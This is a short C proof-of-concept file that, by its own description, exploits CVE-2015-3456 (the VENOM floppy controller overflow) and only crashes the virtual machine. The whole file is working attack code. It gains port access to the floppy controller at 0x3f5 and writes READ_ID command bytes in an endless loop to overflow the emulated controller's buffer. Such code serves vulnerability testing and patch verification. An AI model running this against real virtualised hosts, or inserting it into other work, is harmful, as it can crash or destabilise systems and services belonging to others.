/**
 * "Exploit" for CVE-2015-3456. Well, this will only crash the VM.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/io.h>

#define FDC_IOPORT 0x3f5
#define FD_CMD_READ_ID 0x0a

int main() {
    char progress[] = { '|', '\\', '-', '/' };
    if (ioperm(FDC_IOPORT, 1, 1) == -1) {
        fprintf(stderr, "[!] Unable to set port access permissions: %m\n");
        exit(EXIT_FAILURE);
    }

    outb(FD_CMD_READ_ID, FDC_IOPORT);
    fprintf(stdout, "[.] Overflow...");
    for (size_t i = 0;; i++) {
        if (i%10000 == 0)
            fprintf(stdout, "\r[%c]", progress[(i/10000)%sizeof(progress)]);
        fflush(stdout);
        outb(0xa, FDC_IOPORT);
    }
    fprintf(stdout, "\n");
    return 0;
}
